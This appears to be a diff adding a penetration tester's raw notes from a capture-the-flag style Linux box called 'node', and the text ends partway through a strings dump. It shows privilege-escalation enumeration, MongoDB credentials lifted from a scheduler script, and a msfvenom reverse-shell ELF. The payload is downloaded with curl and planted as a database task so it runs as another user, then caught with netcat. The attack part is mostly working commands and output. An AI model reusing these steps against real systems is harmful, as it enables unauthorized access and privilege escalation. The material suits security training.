+lrwxrwxrwx 1 root root 30 Aug 29  2017 systemd-update-utmp.service -> ../systemd-update-utmp.service
+lrwxrwxrwx 1 root root 30 May 10  2016 plymouth-read-write.service -> ../plymouth-read-write.service
+lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-start.service -> ../plymouth-start.service
+
+/lib/systemd/system/sockets.target.wants:
+total 0
+lrwxrwxrwx 1 root root 25 Aug 29  2017 systemd-initctl.socket -> ../systemd-initctl.socket
+lrwxrwxrwx 1 root root 32 Aug 29  2017 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
+lrwxrwxrwx 1 root root 34 Aug 29  2017 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
+lrwxrwxrwx 1 root root 26 Aug 29  2017 systemd-journald.socket -> ../systemd-journald.socket
+lrwxrwxrwx 1 root root 31 Aug 29  2017 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
+lrwxrwxrwx 1 root root 30 Aug 29  2017 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
+lrwxrwxrwx 1 root root 14 Jan 12  2017 dbus.socket -> ../dbus.socket
+
+/lib/systemd/system/sigpwr.target.wants:
+total 0
+lrwxrwxrwx 1 root root 36 Aug 29  2017 sigpwr-container-shutdown.service -> ../sigpwr-container-shutdown.service
+
+/lib/systemd/system/systemd-resolved.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 200 Jul 17  2017 resolvconf.conf
+
+/lib/systemd/system/systemd-timesyncd.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 251 Jul  5  2017 disable-with-time-daemon.conf
+
+/lib/systemd/system/timers.target.wants:
+total 0
+lrwxrwxrwx 1 root root 31 Aug 29  2017 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer
+
+/lib/systemd/system/local-fs.target.wants:
+total 0
+lrwxrwxrwx 1 root root 29 Aug 29  2017 systemd-remount-fs.service -> ../systemd-remount-fs.service
+
+/lib/systemd/system/rc-local.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 290 Jul  5  2017 debian.conf
+
+/lib/systemd/system/rescue.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Aug 29  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/resolvconf.service.wants:
+total 0
+lrwxrwxrwx 1 root root 42 Aug 29  2017 systemd-networkd-resolvconf-update.path -> ../systemd-networkd-resolvconf-update.path
+
+/lib/systemd/system/getty.target.wants:
+total 0
+lrwxrwxrwx 1 root root 23 Aug 29  2017 getty-static.service -> ../getty-static.service
+
+/lib/systemd/system/graphical.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Aug 29  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/busnames.target.wants:
+total 0
+
+/lib/systemd/system/runlevel1.target.wants:
+total 0
+
+/lib/systemd/system/runlevel2.target.wants:
+total 0
+
+/lib/systemd/system/runlevel3.target.wants:
+total 0
+
+/lib/systemd/system/runlevel4.target.wants:
+total 0
+
+/lib/systemd/system/runlevel5.target.wants:
+total 0
+
+/lib/systemd/system-sleep:
+total 4.0K
+-rwxr-xr-x 1 root root 92 Mar 17  2016 hdparm
+
+/lib/systemd/system-generators:
+total 680K
+-rwxr-xr-x 1 root root  71K Jul 19  2017 systemd-cryptsetup-generator
+-rwxr-xr-x 1 root root  59K Jul 19  2017 systemd-dbus1-generator
+-rwxr-xr-x 1 root root  43K Jul 19  2017 systemd-debug-generator
+-rwxr-xr-x 1 root root  79K Jul 19  2017 systemd-fstab-generator
+-rwxr-xr-x 1 root root  39K Jul 19  2017 systemd-getty-generator
+-rwxr-xr-x 1 root root 119K Jul 19  2017 systemd-gpt-auto-generator
+-rwxr-xr-x 1 root root  39K Jul 19  2017 systemd-hibernate-resume-generator
+-rwxr-xr-x 1 root root  39K Jul 19  2017 systemd-insserv-generator
+-rwxr-xr-x 1 root root  35K Jul 19  2017 systemd-rc-local-generator
+-rwxr-xr-x 1 root root  31K Jul 19  2017 systemd-system-update-generator
+-rwxr-xr-x 1 root root 103K Jul 19  2017 systemd-sysv-generator
+-rwxr-xr-x 1 root root  11K Apr 16  2016 lvm2-activation-generator
+
+/lib/systemd/system-preset:
+total 4.0K
+-rw-r--r-- 1 root root 869 Jul 19  2017 90-systemd.preset
+
+/lib/systemd/network:
+total 12K
+-rw-r--r-- 1 root root 404 Jul 19  2017 80-container-host0.network
+-rw-r--r-- 1 root root 482 Jul 19  2017 80-container-ve.network
+-rw-r--r-- 1 root root  80 Jul 19  2017 99-default.link
+
+/lib/systemd/system-shutdown:
+total 0
+
+
+### SOFTWARE #############################################
+[-] Sudo version:
+Sudo version 1.8.16
+
+
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/gcc
+/usr/bin/curl
+
+
+[-] Installed compilers:
+ii  g++                                4:5.3.1-1ubuntu1                           amd64        GNU C++ compiler
+ii  g++-5                              5.4.0-6ubuntu1~16.04.4                     amd64        GNU C++ compiler
+ii  gcc                                4:5.3.1-1ubuntu1                           amd64        GNU C compiler
+ii  gcc-5                              5.4.0-6ubuntu1~16.04.4                     amd64        GNU C compiler
+ii  gcc-5-multilib                     5.4.0-6ubuntu1~16.04.4                     amd64        GNU C compiler (multilib support)
+ii  gcc-multilib                       4:5.3.1-1ubuntu1                           amd64        GNU C compiler (multilib files)
+
+
+[-] Can we read/write sensitive files:
+-rw-r--r-- 1 root root 1650 Aug 31  2017 /etc/passwd
+-rw-r--r-- 1 root root 821 Sep  2  2017 /etc/group
+-rw-r--r-- 1 root root 591 Sep  3  2017 /etc/profile
+-rw-r----- 1 root shadow 1190 Sep  3  2017 /etc/shadow
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+[-] All *.conf files in /etc (recursive 1 level):
+-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
+-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
+-rw-r--r-- 1 root root 3028 Aug  1  2017 /etc/adduser.conf
+-rw-r--r-- 1 root root 6816 May 11  2017 /etc/overlayroot.conf
+-rw-r--r-- 1 root root 191 Jan 18  2016 /etc/libaudit.conf
+-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
+-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf
+-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf
+-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
+-rw-r--r-- 1 root root 100 Jan 10  2017 /etc/sos.conf
+-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
+-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf
+-rw-r--r-- 1 root root 703 May  6  2015 /etc/logrotate.conf
+-rw-r--r-- 1 root root 350 Aug 29  2017 /etc/popularity-contest.conf
+-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 2084 Sep  6  2015 /etc/sysctl.conf
+-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
+-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf
+-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
+-rw-r--r-- 1 root root 568 Jul 27  2017 /etc/mongod.conf
+-rw-r--r-- 1 root root 144 Aug 29  2017 /etc/kernel-img.conf
+-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
+-rw-r--r-- 1 root root 7788 Aug 29  2017 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf
+
+
+[-] Any interesting mail in /var/mail:
+total 8
+drwxrwsr-x  2 root mail 4096 Aug  1  2017 .
+drwxr-xr-x 15 root root 4096 Sep  3  2017 ..
+
+
+### SCAN COMPLETE ####################################
+mark@node:/tmp$
+
+
+Gotta Find something and that /bin/snap looks odd ---
+
+
+mark@node:/tmp$ find / -user mark -type f -perm 4000 -exec ls -l {} \; 2>/dev/null
+mark@node:/tmp$ sudo -l
+[sudo] password for mark: 
+Sorry, user mark may not run sudo on node.
+mark@node:/tmp$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
+-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 81672 Jul 17  2017 /usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x 1 root root 428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 14864 Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
+-rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
+-rwsr-xr-x 1 root root 23376 Jan 17  2016 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 27608 Jun 14  2017 /bin/umount
+-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
+-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
+-rwsr-xr-x 1 root root 40152 Jun 14  2017 /bin/mount
+mark@node:/tmp$ 
+
+
+!!! -rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
+
+All Right. What do we got here ????
+
+mark@node:/tmp$ file /usr/local/bin/backup
+/usr/local/bin/backup: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped
+mark@node:/tmp$ ls -lh /usr/local/bin/backup
+-rwsr-xr-- 1 root admin 17K Sep  3  2017 /usr/local/bin/backup
+mark@node:/tmp$ strings /usr/local/bin/backup
+/lib/ld-linux.so.2
+libc.so.6
+_IO_stdin_used
+setuid
+strcpy
+exit
+sprintf
+srand
+fopen
+strncpy
+puts
+time
+clock
+getpid
+fgets
+strstr
+strcspn
+fclose
+strcat
+remove
+system
+geteuid
+strchr
+access
+strcmp
+__libc_start_main
+__gmon_start__
+GLIBC_2.1
+GLIBC_2.0
+PTRh 
+WVSQ
+Y[^_]
+UWVS
+t$,U
+[^_]
+[37m
+[33m
+ %s[!]%s %s
+[32m
+ %s[+]%s %s
+ %s[+]%s Starting archiving %s
+             ____________________________________________________
+            /                                                    \
+           |    _____________________________________________     |
+           |   |                                             |    |
+           |   |             Secure Backup v1.0              |    |
+           |   |_____________________________________________|    |
+           |                                                      |
+            \_____________________________________________________/
+                   \_______________________________________/
+                _______________________________________________
+             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
+          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
+       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
+    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
+ _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
+:-----------------------------------------------------------------------------:
+`---._.-----------------------------------------------------------------._.---'
+Could not open file
+Validated access token
+Ah-ah-ah! You didn't say the magic word!
+Finished! Encoded backup is below:
+UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
+/root
+/etc
+/tmp/.backup_%i
+/usr/bin/zip -r -P magicword %s %s > /dev/null
+/usr/bin/base64 -w0 %s
+The target path doesn't exist
+;*2$"
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7200
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+backup.c
+__FRAME_END__
+__JCR_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+strstr@@GLIBC_2.0
+strcmp@@GLIBC_2.0
+_ITM_deregisterTMCloneTable
+__x86.get_pc_thunk.bx
+strcspn@@GLIBC_2.0
+fgets@@GLIBC_2.0
+_edata
+fclose@@GLIBC_2.1
+time@@GLIBC_2.0
+geteuid@@GLIBC_2.0
+strcat@@GLIBC_2.0
+strcpy@@GLIBC_2.0
+getpid@@GLIBC_2.0
+__data_start
+puts@@GLIBC_2.0
+system@@GLIBC_2.0
+clock@@GLIBC_2.0
+__gmon_start__
+exit@@GLIBC_2.0
+__dso_handle
+displaySuccess
+_IO_stdin_used
+srand@@GLIBC_2.0
+strchr@@GLIBC_2.0
+__libc_start_main@@GLIBC_2.0
+displayWarning
+displayTarget
+__libc_csu_init
+fopen@@GLIBC_2.1
+strncpy@@GLIBC_2.0
+_fp_hw
+access@@GLIBC_2.0
+__bss_start
+main
+setuid@@GLIBC_2.0
+_Jv_RegisterClasses
+sprintf@@GLIBC_2.0
+remove@@GLIBC_2.0
+__TMC_END__
+_ITM_registerTMCloneTable
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rel.dyn
+.rel.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+mark@node:/tmp$ 
+
+
+mark@node:/home/frank$ cat /etc/group | grep tom
+adm:x:4:syslog,tom
+cdrom:x:24:tom
+sudo:x:27:tom
+dip:x:30:tom
+plugdev:x:46:tom
+lxd:x:110:tom
+tom:x:1000:
+lpadmin:x:115:tom
+sambashare:x:116:tom
+admin:x:1002:tom,root
+mark@node:/home/frank$ 
+
+OK so we need to become tom --
+
+⇒  tom       1182  0.0  4.2 1009080 43024 ?       Ssl  02:43   0:02 /usr/bin/node /var/scheduler/app.js
+
+Script --
+
+mark@node:/etc/myplace$ cat /var/scheduler/app.js
+const exec        = require('child_process').exec;
+const MongoClient = require('mongodb').MongoClient;
+const ObjectID    = require('mongodb').ObjectID;
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';
+
+MongoClient.connect(url, function(error, db) {
+  if (error || !db) {
+    console.log('[!] Failed to connect to mongodb');
+    return;
+  }
+
+  setInterval(function () {
+    db.collection('tasks').find().toArray(function (error, docs) {
+      if (!error && docs) {
+        docs.forEach(function (doc) {
+          if (doc) {
+            console.log('Executing task ' + doc._id + '...');
+-->> VULNERABLE HERE <<--
+            EXEC(DOC.CMD);
+-->>
+            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
+          }
+        });
+      }
+      else if (error) {
+        console.log('Something went wrong: ' + error);
+      }
+    });
+  }, 30000);
+
+});
+mark@node:/etc/myplace$ 
+
+└────╼ msfvenom -l payloads | grep "linux/x86"
+    linux/x86/adduser                                   Create a new user with UID 0
+    linux/x86/chmod                                     Runs chmod on specified file with specified mode
+    linux/x86/exec                                      Execute an arbitrary command
+    linux/x86/meterpreter/bind_ipv6_tcp                 Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)
+    linux/x86/meterpreter/bind_ipv6_tcp_uuid            Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
+    linux/x86/meterpreter/bind_nonx_tcp                 Inject the mettle server payload (staged). Listen for a connection
+    linux/x86/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection (Linux x86)
+    linux/x86/meterpreter/bind_tcp_uuid                 Inject the mettle server payload (staged). Listen for a connection with UUID Support (Linux x86)
+    linux/x86/meterpreter/find_tag                      Inject the mettle server payload (staged). Use an established connection
+    linux/x86/meterpreter/reverse_ipv6_tcp              Inject the mettle server payload (staged). Connect back to attacker over IPv6
+    linux/x86/meterpreter/reverse_nonx_tcp              Inject the mettle server payload (staged). Connect back to the attacker
+    linux/x86/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
+    linux/x86/meterpreter/reverse_tcp_uuid              Inject the mettle server payload (staged). Connect back to the attacker
+    linux/x86/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
+    linux/x86/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
+    linux/x86/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
+    linux/x86/metsvc_bind_tcp                           Stub payload for interacting with a Meterpreter Service
+    linux/x86/metsvc_reverse_tcp                        Stub payload for interacting with a Meterpreter Service
+    linux/x86/read_file                                 Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
+    linux/x86/shell/bind_ipv6_tcp                       Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)
+    linux/x86/shell/bind_ipv6_tcp_uuid                  Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
+    linux/x86/shell/bind_nonx_tcp                       Spawn a command shell (staged). Listen for a connection
+    linux/x86/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection (Linux x86)
+    linux/x86/shell/bind_tcp_uuid                       Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)
+    linux/x86/shell/find_tag                            Spawn a command shell (staged). Use an established connection
+    linux/x86/shell/reverse_ipv6_tcp                    Spawn a command shell (staged). Connect back to attacker over IPv6
+    linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
+    linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
+    linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
+    linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
+    linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
+    linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
+    linux/x86/shell_find_port                           Spawn a shell on an established connection
+    linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
+    linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
+    linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6
+┌─╼[~] 
+└────╼ 
+
+Create a Reverse Payload --
+
+└╼  msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.2 LPORT=31337 -f elf > /tmp/r_shell.elf
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+Final size of elf file: 152 bytes
+
+┌─╼[~] 
+└────╼ chown www-data:www-data /tmp/r_shell.elf; mv /tmp/r_shell.elf /var/www/html                    
+┌─╼[~] 
+└────╼ file /var/www/html/r_shell.elf
+/var/www/html/r_shell.elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, corrupted section header size
+┌─╼[~] 
+└────╼ 
+
+
+Get this thing to exec as tom --
+We know he has sudo access --
+
+mark@node:/tmp$ ps -ef | grep tom
+tom       1177     1  0 02:43 ?        00:00:12 /usr/bin/node /var/www/myplace/app.js
+tom       1182     1  0 02:43 ?        00:00:14 /usr/bin/node /var/scheduler/app.js
+mark      7834  2251  0 16:47 pts/0    00:00:00 grep --color=auto tom
+mark@node:/tmp$ curl -O http://192.168.0.2/r_shell.elf
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   249  100   249    0     0  35109      0 --:--:-- --:--:-- --:--:-- 41500
+mark@node:/tmp$ chmod 755 r_shell.elf
+mark@node:/tmp$ 
+
+MongoDB INFOZ --
+https://docs.mongodb.com/manual/reference/command/index.html
+https://docs.mongodb.com/v3.2/reference/command/
+https://docs.mongodb.com/v3.2/reference/method/db.collection.insertOne/
+https://gist.github.com/amirkheirabadi/5859662
+
+mark@node:/tmp$ rm -fR r_shell.elf 
+mark@node:/tmp$ curl -sk -O http://192.168.0.2/r_shell.elf
+mark@node:/tmp$ chmod 755 r_shell.elf
+mark@node:/tmp$ mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler
+MongoDB shell version: 3.2.16
+connecting to: localhost:27017/scheduler
+> db
+scheduler
+> show collections
+tasks
+> db.tasks.insert
+db.tasks.insert(      db.tasks.insertMany(  db.tasks.insertOne(
+> db.tasks.insertOne({cmd:'/tmp/r_shell.elf'})
+{
+	"acknowledged" : true,
+	"insertedId" : ObjectId("5b731be80ee6cab207dcdfab")
+}
+> 
+
+SHELL !!! --
+
+└────╼ nc -lvp 31337           
+listening on [any] 31337 ...
+connect to [192.168.0.2] from node1 [192.168.0.14] 36618
+id
+uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1002(admin)
+bash -i
+bash: cannot set terminal process group (1182): Inappropriate ioctl for device
+bash: no job control in this shell
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+tom@node:/$ sudo -l
+sudo -l
+sudo: no tty present and no askpass program specified
+tom@node:/$ sudo -S -l
+sudo -S -l
+[sudo] password for tom: snowflake
+Sorry, try again.
+[sudo] password for tom: ^C
+┌─╼[~] 
+└╼  nc -lvp 31337
+listening on [any] 31337 ...
+connect to [192.168.0.2] from node1 [192.168.0.14] 36620
+bash -i
+bash: cannot set terminal process group (1182): Inappropriate ioctl for device
+bash: no job control in this shell
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+tom@node:/$ python -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+tom@node:/$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
+<=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null      
+-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 81672 Jul 17  2017 /usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x 1 root root 428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 14864 Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
+-rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
+-rwsr-xr-x 1 root root 23376 Jan 17  2016 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 27608 Jun 14  2017 /bin/umount
+-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
+-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
+-rwsr-xr-x 1 root root 40152 Jun 14  2017 /bin/mount
+tom@node:/$ which backup
+which backup
+/usr/local/bin/backup
+tom@node:/$ ls -lh /usr/local/bin/backup
+ls -lh /usr/local/bin/backup
+-rwsr-xr-- 1 root admin 17K Sep  3  2017 /usr/local/bin/backup
+tom@node:/$ 
+
+Check BACKUP FILE --
+WE NOW HAVE PERMS AND WE DO HAVE SUDO ( We don't know the password yet ) --
+
+tom@node:/$ strings /usr/local/bin/backup
+strings /usr/local/bin/backup
+/lib/ld-linux.so.2
+libc.so.6
+_IO_stdin_used
+setuid
+strcpy
+exit
+sprintf
+srand
+fopen
+strncpy
+puts
+time
+clock
+getpid
+fgets
+strstr
+strcspn
+fclose
+strcat
+remove
+system
+geteuid
+strchr
+access
+strcmp
+__libc_start_main
+__gmon_start__
+GLIBC_2.1
+GLIBC_2.0
+PTRh 
+WVSQ
+Y[^_]
+UWVS
+t$,U
+[^_]
+[37m
+[33m
+ %s[!]%s %s
+[32m
+ %s[+]%s %s
+ %s[+]%s Starting archiving %s
+             ____________________________________________________
+            /                                                    \
+           |    _____________________________________________     |
+           |   |                                             |    |
+           |   |             Secure Backup v1.0              |    |
+           |   |_____________________________________________|    |
+           |                                                      |
+            \_____________________________________________________/
+                   \_______________________________________/
+                _______________________________________________
+             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
+          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
